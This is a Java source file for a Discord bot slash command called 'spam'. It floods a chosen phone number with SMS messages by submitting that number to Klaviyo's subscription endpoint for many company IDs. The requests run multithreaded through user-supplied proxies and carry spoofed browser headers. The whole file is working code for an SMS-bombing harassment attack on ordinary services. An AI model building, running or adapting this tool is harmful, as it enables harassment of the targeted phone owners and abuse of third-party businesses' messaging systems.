package io.github.srinss01.smsspambot.commands;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonSyntaxException;
import com.mashape.unirest.http.HttpResponse;
import com.mashape.unirest.http.Unirest;
import io.github.srinss01.smsspambot.SMSSpamBotApplication;
import io.github.srinss01.smsspambot.database.Proxies;
import io.github.srinss01.smsspambot.database.ProxiesRepo;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.events.interaction.ModalInteractionEvent;
import net.dv8tion.jda.api.interactions.commands.SlashCommandInteraction;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
import net.dv8tion.jda.api.interactions.modals.Modal;
import net.dv8tion.jda.api.interactions.modals.ModalMapping;
import net.dv8tion.jda.internal.interactions.CommandDataImpl;
import org.apache.http.HttpHost;
import org.apache.http.auth.AuthSchemeProvider;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.CredentialsProvider;
import org.apache.http.client.config.AuthSchemes;
import org.apache.http.config.Lookup;
import org.apache.http.config.RegistryBuilder;
import org.apache.http.impl.auth.BasicSchemeFactory;
import org.apache.http.impl.client.BasicCredentialsProvider;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.ProxyAuthenticationStrategy;

import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.Optional;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.function.Function;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static java.net.HttpURLConnection.HTTP_ACCEPTED;

@SuppressWarnings("unchecked")
public class Spam extends CommandDataImpl implements ICustomCommandData {
    private final ProxiesRepo proxiesRepo;
    // logger
    private static final org.slf4j.Logger logger = org.slf4j.LoggerFactory.getLogger(Spam.class);
    private static final Gson GSON = new GsonBuilder().setPrettyPrinting().create();
    public static final Function<ProxiesRepo, Spam> COMMAND = Spam::new;

    public Spam(ProxiesRepo proxiesRepo) {
        super("spam", "Spams SMS to a number");
        this.proxiesRepo = proxiesRepo;
    }

    public void onModalInteraction(ModalInteractionEvent event) {
        String areaCode = Objects.requireNonNull(event.getValue("area-code")).getAsString();
        String number = Objects.requireNonNull(event.getValue("number")).getAsString();
        String messageCount = Objects.requireNonNull(event.getValue("message-count")).getAsString();
        int messageCountInt = Integer.parseInt(messageCount);
        ModalMapping threadCount = event.getValue("thread-count");
        String proxy = Objects.requireNonNull(event.getValue("proxy")).getAsString();
        String threadCountString = threadCount == null ? "4" : threadCount.getAsString();
        threadCountString = threadCountString.isBlank() ? "4" : threadCountString;
        if (!areaCode.matches("^\\d{1,3}$")) {
            event.reply("Invalid area code").setEphemeral(true).queue();
            return;
        }
        if (!number.matches("^\\d{10}$")) {
            event.reply("Invalid number").setEphemeral(true).queue();
            return;
        }
        if (!messageCount.matches("^\\d{1,3}$")) {
            event.reply("Invalid message count").setEphemeral(true).queue();
            return;
        }
        if (!threadCountString.matches("^\\d{1,2}$")) {
            event.reply("Invalid thread count").setEphemeral(true).queue();
            return;
        }
        Pattern pattern = Pattern.compile("^(?<usr>[\\w-]+):(?<pswrd>[\\w-]+)@(?<host>\\w+(.\\w)*):(?<port>\\d+)$");
        Matcher matcher = pattern.matcher(proxy);
        if (!matcher.find()) {
            event.reply("Invalid proxy").setEphemeral(true).queue();
            return;
        }
        event.reply("Initiating SMS spam...").setEphemeral(true).queue();
        long userId = event.getUser().getIdLong();
        Optional<Proxies> proxies = proxiesRepo.findById(userId);
        // if proxies.get().getProxy() don't match proxy string then update the database
        if (proxies.isPresent()) {
            Proxies _proxy = proxies.get();
            if (!_proxy.getProxy().equals(proxy)) {
                _proxy.setProxy(proxy);
                proxiesRepo.save(_proxy);
            }
        } else {
            proxiesRepo.save(new Proxies(userId, proxy));
        }
        TextChannel textChannel = event.getChannel().asTextChannel();
        int threadCountInt = Integer.parseInt(threadCountString);
        ScheduledThreadPoolExecutor executor = new ScheduledThreadPoolExecutor(threadCountInt);
        int executed = 0;
        List<String> sites = SMSSpamBotApplication.getSITES();
        do {
            executor.schedule(() -> {
                for (int i = 0; i < messageCountInt; i++) {
                    String site = sites.get(i);
                    if (site == null) {
                        continue;
                    }
                    try {
                        Map<String, Object> map = GSON.fromJson(site, Map.class);
                        String companyId = map.get("company_id").toString();
                        String phoneNumber = areaCode + number;
                        String siteData = GSON.toJson(map.get("site_data")).replace("{number}", phoneNumber);
                        String host = matcher.group("host");
                        String port = matcher.group("port");
                        String usr = matcher.group("usr");
                        String pswrd = matcher.group("pswrd");
                        HttpClientBuilder clientBuilder = HttpClientBuilder.create();


                        CredentialsProvider credsProvider = new BasicCredentialsProvider();

                        credsProvider.setCredentials(AuthScope.ANY, new UsernamePasswordCredentials(usr, pswrd));

                        clientBuilder.useSystemProperties();

                        clientBuilder.setProxy(new HttpHost(host, Integer.parseInt(port)));
                        clientBuilder.setDefaultCredentialsProvider(credsProvider);
                        clientBuilder.setProxyAuthenticationStrategy(new ProxyAuthenticationStrategy());


                        Lookup<AuthSchemeProvider> authProviders = RegistryBuilder.<AuthSchemeProvider>create()
                                .register(AuthSchemes.BASIC, new BasicSchemeFactory())
                                .build();
                        clientBuilder.setDefaultAuthSchemeRegistry(authProviders);


                        Unirest.setHttpClient(clientBuilder.build());
                        HttpResponse<String> response = Unirest
                                .post("https://a.klaviyo.com/client/subscriptions/?company_id=" + companyId)
                                .header("authority", "a.klaviyo.com")
                                .header("accept", "*/*")
                                .header("accept-language", "en-US,en;q=0.9")
                                .header("access-control-allow-headers", "*")
                                .header("revision", "2023-02-22")
                                .header("content-type", "application/json")
                                .header("sec-fetch-dest", "empty")
                                .header("sec-fetch-mode", "cors")
                                .header("sec-fetch-site", "cross-site")
                                .header("sec-gpc", "1")
                                .header("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36")
                                .body(siteData)
                                .asString();
                        if (response.getStatus() == HTTP_ACCEPTED) {
                            textChannel.sendMessageFormat("```SMS sent to +%s, from company ID: %s```", phoneNumber, companyId).queue();
                        } else {
                            textChannel.sendMessageFormat("```Failed to send message to +%s, from company ID: %s```", phoneNumber, companyId).queue();
                            logger.info(response.getBody());
                        }
                        Thread.sleep(1000);
                    } catch (InterruptedException | JsonSyntaxException | com.mashape.unirest.http.exceptions.UnirestException e) {
                        logger.error("Error while sending message", e);
                    }
                }
            }, 2, TimeUnit.SECONDS);
            executed++;
        } while (executed < threadCountInt);
    }

    @Override
    public void execute(SlashCommandInteraction interaction) {
        long idLong = interaction.getUser().getIdLong();
        Optional<Proxies> proxies = proxiesRepo.findById(idLong);
        TextInput areaCode = TextInput.create("area-code", "Area Code", TextInputStyle.SHORT)
                .setMinLength(1)
                .setMaxLength(3)
                .setPlaceholder("XXX")
                .setRequired(true)
                .build();
        TextInput number = TextInput.create("number", "Phone Number", TextInputStyle.SHORT)
                .setMinLength(10)
                .setMaxLength(10)
                .setPlaceholder("XXXXXXXXXX")
                .setRequired(true)
                .build();
        TextInput messageCount = TextInput.create("message-count", "Message Count", TextInputStyle.SHORT)
                .setMinLength(1)
                .setMaxLength(3)
                .setPlaceholder("Enter the number of messages to send")
                .setRequired(true)
                .build();
        TextInput threadCount = TextInput.create("thread-count", "Thread Count", TextInputStyle.SHORT)
                .setMinLength(1)
                .setMaxLength(2)
                .setRequired(false)
                .setPlaceholder("Thread Count")
                .build();
        TextInput proxy = TextInput.create("proxy", "Proxy", TextInputStyle.SHORT)
                .setMinLength(1)
                .setPlaceholder("user:pass@ip:port")
                .setRequired(true)
                .setValue(proxies.map(Proxies::getProxy).orElse(null))
                .build();
        Modal modal = Modal.create("spam", "Details")
                .addComponents(ActionRow.of(areaCode), ActionRow.of(number), ActionRow.of(messageCount), ActionRow.of(threadCount), ActionRow.of(proxy))
                .build();
        interaction.replyModal(modal).queue();
    }
}
